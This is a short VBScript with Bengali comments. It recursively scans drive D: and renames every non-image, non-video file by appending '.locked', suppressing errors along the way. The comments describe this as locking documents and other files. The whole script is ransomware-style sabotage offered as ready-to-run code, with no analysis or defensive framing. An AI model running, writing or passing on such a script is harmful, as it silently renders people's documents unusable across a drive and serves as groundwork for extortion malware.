Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' ড্রাইভ লেটার সেট করুন (যেমন D: বা E: ড্রাইভ)
ScanDrive "D:\"

Sub ScanDrive(path)
    On Error Resume Next
    Set folder = fso.GetFolder(path)
    
    ' ফাইল চেক এবং লক করা
    For Each file In folder.Files
        ext = LCase(fso.GetExtensionName(file.Name))
        ' ছবি এবং ভিডিওর ফরম্যাটগুলো এখানে বাদ দেওয়া হয়েছে
        If ext <> "jpg" And ext <> "jpeg" And ext <> "png" And ext <> "gif" And _
           ext <> "mp4" And ext <> "mkv" And ext <> "avi" And ext <> "mov" And _
           ext <> "locked" Then
            
            ' শুধুমাত্র ডকুমেন্ট বা অন্য ফাইল লক হবে
            file.Name = file.Name & ".locked"
        End If
    Next

    ' সব সাব-ফোল্ডার স্ক্যান করা (Recursive)
    For Each subFolder In folder.SubFolders
        ScanDrive subFolder.Path
    Next
End Sub
